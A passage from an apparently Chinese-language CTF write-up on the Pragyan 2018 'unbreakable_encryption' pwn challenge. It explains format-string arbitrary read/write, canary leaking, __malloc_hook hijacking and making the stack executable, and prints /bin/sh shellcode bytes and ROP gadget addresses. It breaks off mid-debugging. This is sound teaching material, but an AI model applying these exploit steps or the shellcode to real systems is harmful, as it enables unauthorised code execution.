file, to flush the output streams properly. The modified binary is named aes_enc_unbf, and will be running on 128.199.224.175:33100</span><br></pre></td></tr></table></figure><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/pragyan2018/unbreakable_encryption" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/pragyan2018/unbreakable_encryption</a></p><h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h3><p>pwn题中，有形如下述代码的形式就是格式化字符串漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br></pre></td></tr></table></figure></p><p>也许使用者的目的只是直接输出字符串，但是这段字符串来源于可控的输入，就造成了漏洞。<br>示例程序如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">  <span class="built_in">printf</span>(str)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译：<code>gcc -m32 -o str str.c</code><br>输入：<code>%2$x</code><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-05-142756.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-05-142805.jpg" alt=""><br>原因是如果直接printf(“占位符”)这种形式，就会把栈上的偏移当做数据输出出来。通过构造格式化串，就可以实现任意地址读和任意地址写。</p><h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>事实上，我们在scanf(或者read)来输入字符串的时候，字符串就已经在栈中了，如图，可以看出偏移为6。如果我们构造出<code>addr(4字节)%6$s</code>，就能读取这个地址的值了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-05-142854.jpg" alt=""><br>我们尝试一下，输入<code>AAAA%6$s</code>，当然不可能真的读到地址为41414141的内存值，不过从下图我框起来的内容就知道，如果我们输入一个合法的值，就可以读了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-05-142934.jpg" alt=""></p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>和上面的任意地址读是同理的，只不过利用了格式化字符串的一个比较冷门的特性，%n。<br>这个占位符可以把它前面输出的字符的数量，写入指定的地址。<br>比如<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"abc%n"</span>, &amp;val);</span><br></pre></td></tr></table></figure></p><p>val的值就被改变为3。</p><h3 id="64位格式化字符串"><a href="#64位格式化字符串" class="headerlink" title="64位格式化字符串"></a>64位格式化字符串</h3><p>下述示例来源于RE4B。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"a=%d; b=%d; c=%d; d=%d; e=%d; f=%d; g=%d; h=%d</span></span><br><span class="line"><span class="string">"</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>linux上优先使用RDI，RSI，RDX，RCX，R8，R9寄存器传递前6个参数，然后利用栈传递其余参数。<br>汇编代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">    .string &quot;a=%d; b=%d; c=%d; d=%d; e=%d; f=%d; g=%d; h=%d</span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">    sub     rsp, 40</span><br><span class="line"></span><br><span class="line">    mov     r9d, 5 #第6个参数</span><br><span class="line">    mov     r8d, 4 #第5个参数</span><br><span class="line">    mov     ecx, 3 #第4参数</span><br><span class="line">    mov     edx, 2 #第3个参数</span><br><span class="line">    mov     esi, 1 #第2个参数</span><br><span class="line">    mov     edi, OFFSET FLAT:.LC0 #第1个参数</span><br><span class="line">    xor     eax, eax ; number of vector registers passed</span><br><span class="line">    mov     DWORD PTR [rsp+16], 8 #第9个参数</span><br><span class="line">    mov     DWORD PTR [rsp+8], 7 #第8个参数</span><br><span class="line">    mov     DWORD PTR [rsp], 6 #第7个参数</span><br><span class="line">    call    printf</span><br><span class="line"></span><br><span class="line">    ; return 0</span><br><span class="line"></span><br><span class="line">    xor     eax, eax</span><br><span class="line">    add     rsp, 40</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></p><p>所以有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info registers</span><br><span class="line">rax     0x0     0</span><br><span class="line">rbx     0x0     0</span><br><span class="line">rcx     0x3     3</span><br><span class="line">rdx     0x2     2</span><br><span class="line">rsi     0x1     1</span><br><span class="line">rdi     0x400628 4195880</span><br><span class="line">rbp     0x7fffffffdf60 0x7fffffffdf60</span><br><span class="line">rsp     0x7fffffffdf38 0x7fffffffdf38</span><br><span class="line">r8      0x4     4</span><br><span class="line">r9      0x5     5</span><br><span class="line">r10     0x7fffffffdce0 140737488346336</span><br><span class="line">r11     0x7ffff7a65f60 140737348263776</span><br><span class="line">r12     0x400440 4195392</span><br><span class="line">r13     0x7fffffffe040 140737488347200</span><br><span class="line">r14     0x0     0</span><br><span class="line">r15     0x0     0</span><br><span class="line">rip     0x7ffff7a65f60 0x7ffff7a65f60 &lt;__printf&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/10g $rsp</span><br><span class="line">0x7fffffffdf38: 0x0000000000400576 -&gt; 返回地址 0x0000000000000006</span><br><span class="line">0x7fffffffdf48: 0x0000000000000007 0x00007fff00000008</span><br><span class="line">0x7fffffffdf58: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x7fffffffdf68: 0x00007ffff7a33de5 0x0000000000000000</span><br><span class="line">0x7fffffffdf78: 0x00007fffffffe048 0x0000000100000000</span><br></pre></td></tr></table></figure><p><strong>所以在64位格式化字符串漏洞利用时，要注意如何计算偏移，因为即使没有占位符，我们依然是按照这个传参规则来读取变量的。</strong></p><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a><a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="noopener">fmtstr</a></h4><p>上面说过我们要利用格式化串漏洞就要得到格式化串的偏移,pwntools有自动化代码可以得到这个偏移。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line"><span class="keyword">print</span> autofmt.offset</span><br></pre></td></tr></table></figure></p><h4 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h4><p>生成任意地址写的payload的函数.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, &#123;key: value&#125;)</span><br></pre></td></tr></table></figure></p><p>fmtstr_payload有两个参数</p><ul><li>第一个参数是int，用于表示取参数的偏移个数</li><li>第二个参数是字典，字典的意义是往key的地址，写入value的值</li></ul><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ checksec aes_enc_unbf </span><br><span class="line">[*] &apos;/home/sakura/unbreakable_encryption/aes_enc_unbf&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ ldd aes_enc_unbf </span><br><span class="line">not a dynamic executable</span><br></pre></td></tr></table></figure><h3 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ ./aes_enc_unbf </span><br><span class="line"></span><br><span class="line">Enter message :- </span><br><span class="line">sakura</span><br><span class="line"></span><br><span class="line">Your message is :- </span><br><span class="line">sakura</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> The encrypted message for the given plaintext is :- </span><br><span class="line">0000 - b2 c4 08 6e 77 66 cb 59-b3 6a 4a 8b ed 35 98 05   ...nwf.Y.jJ..5..</span><br><span class="line"></span><br><span class="line">Decrypted text is:</span><br><span class="line">sakura</span><br></pre></td></tr></table></figure><p>读取输入并打印，并将其传递给encrypt，加载aes文件，加密消息并将其输出到屏幕。<br>然后它调用decrypt解密，并将明文输出到屏幕上。</p><h3 id="栈溢出-1"><a href="#栈溢出-1" class="headerlink" title="栈溢出"></a>栈溢出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v5; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line"><span class="keyword">char</span> v6; <span class="comment">// [esp+8Bh] [ebp-Dh]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Enter message :- "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%s"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v5); <span class="comment">//bug</span></span><br></pre></td></tr></table></figure><p>scanf处存在栈溢出，上一个题的前置知识已经说过了。<br>不过这个题因为有canary，所以不能用来直接getshell，我们要想其他方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ ./aes_enc_unbf </span><br><span class="line"></span><br><span class="line">Enter message :- </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span><br><span class="line"></span><br><span class="line">Your message is :- </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1A</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> The encrypted message for the given plaintext is :- </span><br><span class="line">0000 - d5 55 d2 b4 58 fb d3 04-16 cd 58 fb 63 0f ea 16   .U..X.....X.c...</span><br><span class="line">0010 - 9f ce d0 d3 0a 9a 15 c8-ab aa 76 69 00 18 78 1b   ..........vi..x.</span><br><span class="line">0020 - e6 1d c0 01 bf 44 f1 e5-dc 22 ba 2a ae d2 e3 f4   .....D...&quot;.*....</span><br><span class="line">0030 - 39 7b fb f1 fb 99 79 b7-b9 16 f7 37 3d a1 4c 38   9&#123;....y....7=.L8</span><br><span class="line">0040 - 16 75 9d b2 23 60 0a a2-91 12 7c 22 e2 8e 90 83   .u..#`....|&quot;....</span><br><span class="line">0050 - b1 60 46 2d 7b e3 18 12-65 62 85 db e5 95 fe 1f   .`F-&#123;...eb......</span><br><span class="line">0060 - b2 11 7e 38 43 05 4f d2-28 84 5a c7 39 2c 06 41   ..~8C.O.(.Z.9,.A</span><br><span class="line">0070 - f1 ee 61 c6 1c b6 e7 52-b3 fd 8c 30 16 bb 6c 38   ..a....R...0..l8</span><br><span class="line"></span><br><span class="line">Decrypted text is:</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1A</span><br><span class="line"></span><br><span class="line">*** stack smashing detected ***: ./aes_enc_unbf terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure></p><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+8Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter message :- "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%s"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v5);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nYour message is :- "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;v5);<span class="comment">//bug</span></span><br></pre></td></tr></table></figure><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为静态链接，所以不能改写GOT表，考虑使用malloc_hook来解题，可以参考0ctf的easiestprintf。<br>其次因为有canary，所以要先leak出canary。<br>所以总的思路就出来了：</p><ol><li>通过格式化字符串的任意地址读写leak出canary的值，并劫持malloc_hook，使其指向main函数。<br>这样当执行malloc的时候，就会跳回main函数，然后重新执行程序。</li><li>然后我们修改_stack_prot的值为0x7，之后再次跳回main函数。</li><li>最后将malloc_hook的值还原为0，不再跳回main函数，然后因为之前已经leak出了canary的值，就可以触发栈溢出，将返回地址设置为_dl_make_stack_executable，并传入参数_libc_stack_end，因为之前_stack_prot的值已经被设置为0x7，这个函数将会使得栈可执行，取消NX保护，最后跳回我们预先写好的shellcode就可以getshell了。<h3 id="准备shellcode"><a href="#准备shellcode" class="headerlink" title="准备shellcode"></a>准备shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x1000:xoreax, eax</span><br><span class="line">0x1002:pusheax</span><br><span class="line">0x1003:push0x68732f2f</span><br><span class="line">0x1008:push0x6e69622f</span><br><span class="line">0x100d:pusheax</span><br><span class="line">0x100e:pusheax</span><br><span class="line">0x100f:popecx</span><br><span class="line">0x1010:popedx</span><br><span class="line">0x1011:movebx, esp</span><br><span class="line">0x1013:push0x5b</span><br><span class="line">0x1015:popeax</span><br><span class="line">0x1016:xoral, 0x50</span><br><span class="line">0x1018:int0x80</span><br><span class="line">0x101a:</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x50\x50\x59\x5A\x89\xE3\x6A\x5B\x58\x34\x50\xCD\x80</span><br></pre></td></tr></table></figure><h3 id="准备参数"><a href="#准备参数" class="headerlink" title="准备参数"></a>准备参数</h3><ul><li>dl_make_stack_executable<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __usercall dl_make_stack_executable@&lt;eax&gt;(_DWORD *a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 != _libc_stack_end )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v1 = a1;</span><br><span class="line">  result = mprotect(*a1 &amp; -dl_pagesize, dl_pagesize, _stack_prot);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> __readgsdword(<span class="number">0xFFFFFFE8</span>);</span><br><span class="line">  *v1 = <span class="number">0</span>;</span><br><span class="line">  dl_stack_flags |= <span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>参数a1应该为_libc_stack_end的地址了。_stack_prot通过rop修改为0x7即111b，这样的话stack就是可执行的了，然后就可以执行shellcode了。<br>直接search。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-06-033250.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_libc_stack_end = 0x0822ECE8</span><br><span class="line">__stack_prot = 0x0822EC98</span><br><span class="line">_dl_make_stack_executable = 0x081715D0</span><br></pre></td></tr></table></figure></p><ul><li>malloc_hook<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-06-033601.png" alt=""></li><li><p>main<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-06-041310.png" alt=""></p></li><li><p>pop_eax</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ ROPgadget --binary aes_enc_unbf --only &quot;pop|ret&quot;|grep eax</span><br><span class="line">0x0813ed14 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0817b0ea : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0804c906 : pop eax ; ret</span><br><span class="line">0x0818f350 : pop eax ; ret 0xffe4</span><br><span class="line">0x0817b0e9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure></li></ul><p>pop_eax = 0x0804c906</p><ul><li>jmp_esp<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ ROPgadget --binary aes_enc_unbf --only &quot;jmp&quot;|grep esp</span><br><span class="line">0x08174bec : jmp esp</span><br></pre></td></tr></table></figure></li></ul><p>jmp_esp = 0x08174bec </p><h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>要确定偏移需要多次调试，没有什么好的方法。<br>这里我也是把已经调试好的偏移直接带入跟了一遍而已。<br>要在pwntools里用gdb调试，首先要先设置好断点文件，然后gdb.attach(r,open(filename))<br>得到断点文件的方法如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x8048d73</span><br><span class="line">Breakpoint 1 at 0x8048d73</span><br><span class="line">gef➤  save breakpoints filename</span><br></pre></td></tr></table></figure></p><p>然后执行程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/sakura/unbreakable_encryption# python exp.py 1</span><br><span class="line">[+] Starting local process &apos;./aes_enc_unbf&apos;: pid 25217</span><br><span class="line">debug?</span><br><span class="line">[*] X: 0x804</span><br><span class="line">[*] Y: 0x84dc</span><br><span class="line">[*] running in new terminal: /usr/bin/gdb -q  &quot;/home/sakura/unbreakable_encryption/aes_enc_unbf&quot; 25217 -x &quot;/tmp/pwndl_JQG.gdb&quot;</span><br><span class="line">[+] Waiting for debugger: Done</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1 at 0x8048d73</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">gef➤  si</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x81115cb &lt;__correctly_grouped_prefixmb+715&gt; jmp    0x8111578 &lt;__correctly_grouped_prefixmb+632&gt;</span><br><span class="line">    0x81115cd                  xchg   ax, ax</span><br><span class="line">    0x81115cf                  nop    </span><br><span class="line"> →  0x81115d0 &lt;printf+0&gt;       sub    esp, 0xc</span><br><span class="line">    0x81115d3 &lt;printf+3&gt;       lea    eax, [esp+0x14]</span><br><span class="line">    0x81115d7 &lt;printf+7&gt;       sub    esp, 0x4</span><br><span class="line">    0x81115da &lt;printf+10&gt;      push   eax</span><br><span class="line">    0x81115db &lt;printf+11&gt;      push   DWORD PTR [esp+0x18]</span><br><span class="line">    0x81115df &lt;printf+15&gt;      push   DWORD PTR ds:0x8230538</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-06-155208.png" alt=""><br>printf执行完后，malloc_hook等于main函数的首地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /gx 0x08230598</span><br><span class="line">0x8230598 &lt;__malloc_hook&gt;:0x0000000008048ce0</span><br></pre></td></tr></table></figure></p><p>跳回main函数，为了确定跳回，先在main下个断点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x08048CE0</span><br><span class="line">gef➤  c</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-06-160953.png" alt=""><br>继续执行，断在printf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  c</span><br><span class="line">gef➤  si # 